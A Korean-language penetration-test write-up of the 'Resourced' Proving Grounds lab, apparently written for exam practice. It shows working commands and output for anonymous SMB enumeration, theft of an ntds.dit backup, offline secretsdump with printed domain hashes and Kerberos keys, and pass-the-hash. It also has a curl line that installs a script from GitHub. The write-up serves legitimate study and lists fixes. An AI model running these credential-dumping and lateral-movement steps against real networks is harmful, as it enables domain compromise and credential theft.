---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/rbcd
  - tech/ad/delegation
  - tech/ad/pth
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
type: machine
platform: pg
os: windows
ip: 192.168.125.175
domain: resourced.local
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---

> [!info] 요약
> 타겟 `192.168.125.175` (2026-07-03 세션) → `192.168.120.175` (07-06 세션 재배정) · Windows Server 2019 Standard Evaluation build 17763 · `RESOURCEDC.resourced.local` · Intermediate · 플래그 2개
> 진입점: 익명 SMB 사용자 열거 → `V.Ventz` 의 `description` 필드에 적힌 평문 `HotelCalifornia194!` → 비표준 공유 `Password Audit` 에 방치된 `ntds.dit` + `SYSTEM`/`SECURITY` 하이브 → 오프라인 `secretsdump` 로 전 도메인 NT 해시 → 만료되지 않은 `L.Livingstone` 해시로 PtH → WinRM
> 권한상승: BloodHound 가 `L.Livingstone --GenericAll--> RESOURCEDC$` 확인 → 머신계정 `4Leaf$` 생성 → RBCD 속성 쓰기 → S4U2Self/S4U2Proxy 로 `cifs/resourcedc.resourced.local` 티켓 → psexec → SYSTEM
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.125.175 · 192.168.120.175

**호스트는 «한 대»다.** IP 가 둘인 것은 오타가 아니라 세션이 07-03 에서 07-06 으로 넘어가며 PG 가 인스턴스를 재배정했기 때문임. `~/.zsh_history` 에 두 IP 모두 남아 있고(125.175 로 친 명령 35건 · 120.175 로 친 명령 20건), 07-03 산출물은 전자, 07-06 의 RBCD 구간은 후자로 붙었음. **둘 다 실측이므로 하나로 통일하지 않았다.**

### Initial Access – 익명 SMB 열거가 노출한 description 필드의 평문 비밀번호가 공유에 방치된 도메인 백업으로 이어짐

**Vulnerability Explanation:** 세 결함이 사슬로 이어짐.
- `Pre-Windows 2000 Compatible Access` 그룹에 `ANONYMOUS LOGON`(S-1-5-7)이 들어 있어 **널 세션이 도메인 사용자·설명 속성을 전부 읽음.** 원래 인증이 필요한 열거가 무인증으로 성립
- `V.Ventz` 의 `description` 속성에 평문 비밀번호가 저장됨. 이 속성은 인증된 사용자 전원이 읽는 공개 필드 = 자격증명 노출
- 비표준 SMB 공유 `Password Audit` 이 도메인 사용자 READ 로 열려 있고 그 안에 `ntdsutil` IFM 백업(`ntds.dit` + `SYSTEM`/`SECURITY` 하이브)이 방치됨. 셋을 합치면 **DC 에 로그인하지 않고 도메인 전체 NT 해시**를 오프라인으로 복호화 가능

**Vulnerability Fix:**
- `Pre-Windows 2000 Compatible Access` 에서 `S-1-5-7` 제거. 레거시 클라이언트가 없으면 그룹 자체를 비우고 `RestrictAnonymous`·`RestrictAnonymousSAM` 강화
- `description`·`info` 같은 자유 텍스트 속성에 비밀번호 금지. 정기 감사: `Get-ADUser -Filter * -Properties Description`
- IFM 백업은 도메인 자격증명 데이터베이스 그 자체임. 공유에 두지 말고 오프라인·암호화 보관. 이미 노출됐으면 `krbtgt` 를 **두 번** 리셋(골든 티켓 무효화)
- `L.Livingstone`·`V.Ventz` 의 `DONT_EXPIRE_PASSWORD` 해제 — 이것이 2021년 백업 해시를 2026년에도 유효하게 만든 원인

**Severity:** Critical — 무인증 열거 한 번에서 시작해 도메인 전체 자격증명 데이터베이스 탈취까지 도달

**Steps to reproduce the attack:**
1. `nxc smb <IP> --users` 를 **자격증명 없이** 실행 → `-Description-` 열에서 `V.Ventz` 의 평문 비밀번호 회수
2. 그 계정으로 공유 열거 → 비표준 공유 `Password Audit` 확인
3. `smbclient '//<IP>/Password Audit' -U 'V.Ventz%<pass>'` 로 `recurse on; prompt off; mget *`
4. `ntds.dit` 를 하이브와 같은 디렉터리로 복사 후 `impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit`
5. 사용자·NT해시를 행 단위로 짝지어 `nxc smb <IP> -u users.txt -H hashs.txt --no-bruteforce --continue-on-success`
6. 성공한 `L.Livingstone` 해시로 `evil-winrm -H` → local.txt

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.125.175 | TCP: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389, 49666, 49668, 49674, 49675, 49693, 49708 |

49666 이상은 Windows 동적 RPC 범위라 부팅마다 바뀜. 공격면이 아니라 **RPC 엔드포인트 매퍼가 넘겨주는 포트가 실제로 열려 있는지**를 미리 보는 용도임 — 여기가 필터링되면 psexec·wmiexec 이 조용히 실패함.

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nnmap 192.168.125.175
```

`nnmap` 은 오타가 아니라 `~/.zshrc:247` 의 별칭임 — `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. 로그 헤더가 그것을 스스로 증명함.

```text
# Nmap 7.98 scan initiated Fri Jul  3 09:13:33 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.125.175
Nmap scan report for 192.168.125.175
Host is up (0.068s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-03 00:14:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-03T00:15:02+00:00
|_ssl-date: 2026-07-03T00:15:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-07-02T00:11:20
|_Not valid after:  2027-01-01T00:11:20
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-03T00:15:04
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   65.68 ms 192.168.45.1
2   65.64 ms 192.168.45.254
3   66.42 ms 192.168.251.1
4   66.77 ms 192.168.125.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  3 09:15:45 2026 -- 1 IP address (1 host up) scanned in 131.58 seconds
```
— 출처: `~/PG/Resourced/nmap.log`

**버전 판정 독립 근거 둘.** ⑴ nmap OS 추측 `Windows Server 2019 (92%)` + `rdp-ntlm-info` 의 `Product_Version: 10.0.17763` ⑵ 뒤에 나오는 nxc SMB 배너 `Windows 10 / Server 2019 Build 17763 x64`. 서로 독립된 두 프로토콜(RDP NTLM · SMB)에서 같은 빌드 번호가 나옴.

**DC 지문은 포트 조합으로 읽는다.** `88`(Kerberos) + `389/636/3268/3269`(LDAP·GC) + `445` + `53`(DNS)이 함께 열려 있으면 사실상 도메인 컨트롤러임. `3268/3269` 는 글로벌 카탈로그라 포리스트 루트 DC 라는 뜻이고, `9389` 는 ADWS(PowerShell `Get-AD*` 채널), `5985`(WinRM)는 **해시만 얻으면 곧바로 대화형 셸**이라는 신호임 — 이 박스의 결말이 정확히 그것임.

도메인 이름은 세 곳이 일치함 — LDAP 서비스 설명(`Domain: resourced.local`) · `rdp-ntlm-info` · `ssl-cert` CN. 출처 셋이 같으므로 확정.

`smb2-security-mode` 가 **`Message signing enabled and required`** — SMB 서명 강제임. DC 기본값이라 오설정이 아님. 실질적 의미는 **[[Heist]]·[[Vault]] 에서 통한 `ntlmrelayx` → SMB 경로가 여기서는 성립하지 않는다**는 것. 릴레이를 시도하기 전에 이 줄부터 볼 것 — 시도 자체를 아낌. (LDAP/LDAPS·ADCS 쪽 릴레이가 완전히 죽는 것은 아니나 이 박스는 그 경로가 불필요했음.)

**익명 SMB 사용자 열거.** `smbclient -L 192.168.125.175 -N` 으로 널 세션을 먼저 두드린 뒤(`~/.zsh_history` 1340행) nxc 로 사용자 열거.

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 --users
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.125.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.125.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account
SMB         192.168.125.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin
SMB         192.168.125.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer
SMB         192.168.125.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin
SMB         192.168.125.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist
SMB         192.168.125.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist
SMB         192.168.125.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer
SMB         192.168.125.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin
SMB         192.168.125.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god
SMB         192.168.125.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced
```
— 출처: `파일보관/Pasted image 20260703101938.png` (스크린샷은 `S.Swanson` 행에서 잘림. 그 아래 넷과 마지막 집계 줄은 원본 노트 기록)

`V.Ventz` 줄에 평문 비밀번호가 그대로 있음 — `New-hired, reminder: HotelCalifornia194!`. **`-Description-` 열은 출력의 장식이 아니라 본문임.** 같은 함정이 [[Hutch]] 에도 있음(거기서는 LDAP description).

![[Pasted image 20260703101938.png]]

**왜 자격증명 없이 읽혔는가** — BloodHound 그룹 덤프에 직접 찍혀 있음.

```json
{
  "name": "PRE-WINDOWS 2000 COMPATIBLE ACCESS@RESOURCED.LOCAL",
  "members": [
    "RESOURCED.LOCAL-S-1-5-7",
    "RESOURCED.LOCAL-S-1-5-11"
  ]
}
```
— 출처: `~/PG/Resourced/20260703143203_groups.json` 을 `jq` 로 조회(재실행 2026-08-26)

`S-1-5-7` = `ANONYMOUS LOGON`(`S-1-5-11` 은 `Authenticated Users`). 이 그룹은 도메인 개체 읽기 권한을 상속받으므로 널 세션이 사용자·그룹·설명을 전부 읽음. 대조군으로 [[Hutch]] 의 같은 그룹에는 `S-1-5-11` 만 들어 있어 SMB 널 세션 열거가 그 경로로는 되지 않았음.

사용자 목록은 파일로 남김. 14행이고 nxc 집계는 13명인데 **모순이 아님** — nxc 가 센 13은 SAMR 이 돌려준 사용자 계정이고, `users.txt` 에는 뒤에서 secretsdump 로 얻은 머신계정 `RESOURCEDC` 가 추가돼 있음.

```text
Administrator
Guest
RESOURCEDC
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```
— 출처: `~/PG/Resourced/users.txt`

**자격증명 하나로 붙는 서비스를 전수 확인.**

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc-sweep 192.168.125.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
[*] Starting NXC sweep for 192.168.125.175 as V.Ventz ...

[+] Port 445 open. Checking smb ...
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!
SMB         192.168.125.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.125.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.125.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.125.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.125.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.125.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.125.175 445    RESOURCEDC       NETLOGON        READ            Logon server share
SMB         192.168.125.175 445    RESOURCEDC       Password Audit  READ
SMB         192.168.125.175 445    RESOURCEDC       SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.125.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.125.175 5985   RESOURCEDC       [-] resourced.local\V.Ventz:HotelCalifornia194!

[+] Port 3389 open. Checking rdp ...
RDP         192.168.125.175 3389   RESOURCEDC       [*] Windows 10 or Windows Server 2016 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (nla:False)
RDP         192.168.125.175 3389   RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```
— 출처: `파일보관/Pasted image 20260703104211.png`

![[Pasted image 20260703104211.png]]

`nxc-sweep` 은 표준 도구가 아님. 이 박스 작업 중 GitHub 에서 받아 설치한 서드파티 래퍼임(`~/.zsh_history` 1344행 — `curl -sSL 'https://raw.githubusercontent.com/corey-farley/nxc-sweep/main/nxc-sweep' -o nxc-sweep && chmod +x nxc-sweep && sudo mv nxc-sweep /usr/local/bin/`). 시험장에는 없으므로 **수동 대안**은 프로토콜별 nxc 개별 호출임.

```bash
nxc smb   <IP> -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
nxc winrm <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
nxc rdp   <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
nxc ldap  <IP> -u 'V.Ventz' -p 'HotelCalifornia194!'
```

읽어야 할 것 셋:

1. **`Password Audit` 은 기본 공유가 아님.** `ADMIN$`·`C$`·`IPC$`·`NETLOGON`·`SYSVOL` 이 DC 기본 공유이고, 비표준 공유는 그 자체로 신호임. 이름이 하필 「Password Audit」임
2. **WinRM 은 `[-]`, RDP 는 `[+]`.** 같은 자격증명인데 결과가 갈림 — 인증이 아니라 **권한**의 문제임. WinRM 은 `Remote Management Users` 멤버십을 요구하고 `V.Ventz` 는 거기 없음(`Privilege Escalation` 절의 그룹 덤프에서 확인)
3. **`nla:False`.** RDP 에 NLA 가 꺼져 있음 — 사전 인증 없이 로그온 화면까지 도달함. 이 박스에서는 쓰지 않았으나 GUI 가 필요한 상황의 예비 경로

### Initial Access – description 평문 → IFM 백업 → 오프라인 NTDS 덤프 → PtH

**공유 회수.** 공백이 든 공유 이름이라 UNC 전체를 작은따옴표로 감싸야 함.

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ smbclient '//192.168.125.175/Password Audit' -U V.Ventz
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 17:49:16 2021
  ..                                  D        0  Tue Oct  5 17:49:16 2021
  Active Directory                    D        0  Tue Oct  5 17:49:16 2021
  registry                            D        0  Tue Oct  5 17:49:16 2021

                7706623 blocks of size 4096. 2687456 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (2463.5 KiloBytes/sec) (average 2463.5 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (59.9 KiloBytes/sec) (average 2400.9 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (237.0 KiloBytes/sec) (average 2345.3 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (1750.2 KiloBytes/sec) (average 2065.0 KiloBytes/sec)
```
— 출처: `파일보관/Pasted image 20260703133853.png`

![[Pasted image 20260703133853.png]]

세 줄을 외울 것 — `recurse on`(하위 디렉터리까지) · `prompt off`(파일마다 y/n 묻지 않기) · `mget *`. `prompt off` 를 빼면 파일마다 확인을 묻고 비대화식 파이프에서는 그대로 멈춤. `recurse on` 을 빼면 `mget *` 이 디렉터리를 건너뛰는데 **이 공유는 최상위에 파일이 하나도 없어 아무것도 못 받고 끝남.** 비대화식 한 줄 대안:

```bash
smbclient '//192.168.125.175/Password Audit' -U 'V.Ventz%HotelCalifornia194!' -c 'recurse on; prompt off; mget *'
```

전송 직후 디스크 상태(07-03 13:44 촬영):

```text
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ ls
SECURITY  SYSTEM

┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ ls -al ../Active\ Directory
total 24600
drwxrwxr-x 2 kali kali     4096 Jul  3 13:21 .
drwxrwxr-x 4 kali kali     4096 Jul  3 13:21 ..
-rw-r--r-- 1 kali kali 25165824 Jul  3 13:21 ntds.dit
-rw-r--r-- 1 kali kali    16384 Jul  3 13:21 ntds.jfm
```
— 출처: `파일보관/Pasted image 20260703134408.png`

![[Pasted image 20260703134408.png]]

이 시점 `registry/` 에는 하이브 둘뿐임. `ntds.dit` 사본은 그 2분 뒤(13:46) `cp ntds.dit ../registry` 로 들어감(`~/.zsh_history` 1356행). 현재 Kali 의 파일 상태가 그 순서를 그대로 보존하고 있음:

```text
registry:
total 41032
drwxrwxr-x 2 kali kali     4096 Jul  3 13:46 .
drwxrwxr-x 4 kali kali     4096 Jul  6 13:03 ..
-rw-r--r-- 1 kali kali 25165824 Jul  3 13:46 ntds.dit
-rw-r--r-- 1 kali kali    65536 Jul  3 13:21 SECURITY
-rw-r--r-- 1 kali kali 16777216 Jul  3 13:21 SYSTEM
```
— 출처: `ls -la ~/PG/Resourced/registry` 재실행(2026-08-26)

**받은 파일 넷의 «배치»가 출처를 특정한다.**

| 경로 | 크기 | 정체 |
|---|---:|---|
| `Active Directory\ntds.dit` | 25,165,824 | AD 데이터베이스 본체(ESE/JET DB) |
| `Active Directory\ntds.jfm` | 16,384 | ESE 점검 파일(checkpoint/flush map) |
| `registry\SYSTEM` | 16,777,216 | `HKLM\SYSTEM` 하이브 — bootKey 가 여기 있음 |
| `registry\SECURITY` | 65,536 | `HKLM\SECURITY` 하이브 — LSA 시크릿이 여기 있음 |

`ntdsutil "activate instance ntds" "ifm" "create full <경로>"` 는 대상 디렉터리 아래에 `Active Directory\`(→ `ntds.dit`, `ntds.jfm`)와 `registry\`(→ `SECURITY`, `SYSTEM`)를 만듦. 받은 것이 **그 두 디렉터리, 그 네 파일, 그 이름 그대로**임. 대안 후보는 이 배치를 만들지 못함 — `secretsdump -just-dc`(DRSUAPI)는 파일을 아예 안 만들고, `reg save` 수동 백업은 하이브만, `esentutl /y` 복사는 `ntds.dit` 한 개만 나옴.

**[가정]** DC 측 실행 흔적을 볼 수 없으므로 「IFM 산출물과 배치가 일치한다」는 정황 증거에 근거한 판정임. 사람이 같은 구조를 손으로 만들었을 가능성을 완전히 배제하지 못함. 어느 쪽이든 다음 단계(오프라인 파싱)는 달라지지 않음.
**[가정]** 어떤 계정이 언제 실행했는지는 DC 측 로그를 못 봤으므로 확인 불가임. 다만 공유 이름 `Password Audit` 과 디렉터리 타임스탬프 2021-10-05 17:49 가 「비밀번호 감사용으로 뜬 백업」 시나리오와 일치함.

IFM 은 내부적으로 볼륨 섀도 복사(VSS)를 써서 잠긴 `ntds.dit` 를 일관성 있게 뜸 — 「VSS 를 썼느냐」의 답은 **관리자가 썼고 우리는 그 결과물을 주웠다**임.

**우리가 «하지 않은» 것을 명확히 해 둔다** — 태그가 여기서 갈림.

| 기법 | 이 박스에서 썼나 | 근거 |
|---|---|---|
| DCSync (DRSUAPI) | 아니오 | `secretsdump` 를 `local` 모드로 오프라인 파일에 돌림. 출력에 `Using the DRSUAPI method` 줄이 없음 |
| Backup Operators 권한 남용 | 아니오 | `V.Ventz` 는 어떤 특권 그룹에도 없음. 공유 READ 로 끝남 |
| `SeBackupPrivilege` 로 하이브 복사 | 아니오 | 셸조차 없는 시점이었음([[Vault]] 가 그 경로) |
| VSS | 간접적으로만 | 관리자의 IFM 백업이 내부적으로 썼음. 우리가 호출하지 않음 |

**`ntds.dit` 안에서 해시는 삼중 포장돼 있다.**

```text
SYSTEM 하이브
  └─ HKLM\SYSTEM\CurrentControlSet\Control\Lsa 의 하위 키 4개
       {JD}, {Skew1}, {GBG}, {Data} 의 «클래스 이름» 문자열
          └─ 이어붙여 바이트로 → 고정 순열로 뒤섞음 ⇒ bootKey (SysKey), 16바이트
                                                     │
ntds.dit (ESE DB)                                     │
  └─ datatable → 개체 «Domain» 의 pekList 속성        │
       └─ bootKey 로 복호화 ⇒ PEK (Password Encryption Key)
                                     │
  └─ datatable → 사용자 행의 unicodePwd / dBCSPwd / supplementalCredentials
       └─ PEK + 해당 행의 RID 로 복호화 ⇒ NT 해시 / Kerberos 키
```

이 사슬 때문에 **`ntds.dit` 만으로는 아무것도 못 얻음.** `SYSTEM` 하이브가 반드시 함께 있어야 함. 실행 로그가 이 사슬을 한 줄씩 그대로 보여줌 — `bootKey` → `PEK # 0 found and decrypted` → `Reading and decrypting hashes`.

`SECURITY` 하이브는 NT 해시에 필요 없음. 그것이 주는 것은 별개의 전리품임 — `$MACHINE.ACC`(DC 머신계정 평문 hex 및 NT 해시 → 실버 티켓 재료) · `DPAPI_SYSTEM`(저장 자격증명·브라우저 비밀번호 복호화) · `NL$KM`(MSCache2 복호화 키). 캐시된 도메인 로그온 정보는 **비어 있었음** — DC 는 보통 로그온을 캐시하지 않음.

**`local` 은 옵션이 아니라 위치 인자다.** `~/.zsh_history` 1357→1358 에 두 번의 시도가 연속으로 남아 있고, 첫 번째가 이 함정에 걸림.

```text
$ impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit
usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
                      [-security SECURITY] [-sam SAM] [-ntds NTDS]
                      ...
                      target
secretsdump.py: error: the following arguments are required: target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```
— 출처: 원본 노트가 기록한 재실행 결과(2026-08-20). 대화형 세션 캡처 아님

문법은 `secretsdump.py [옵션들] target` 이고 `target` 은 보통 `domain/user:pass@host` 형식임. **오프라인 파일을 깔 때는 그 자리에 문자열 `local` 을 넣음.** 빼면 파싱 단계에서 죽으며, 이 에러는 하이브가 잘못됐다거나 파일이 깨졌다는 뜻이 **아님.** 파일 문제로 오독하면 `ntds.dit` 를 다시 받으러 감.

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
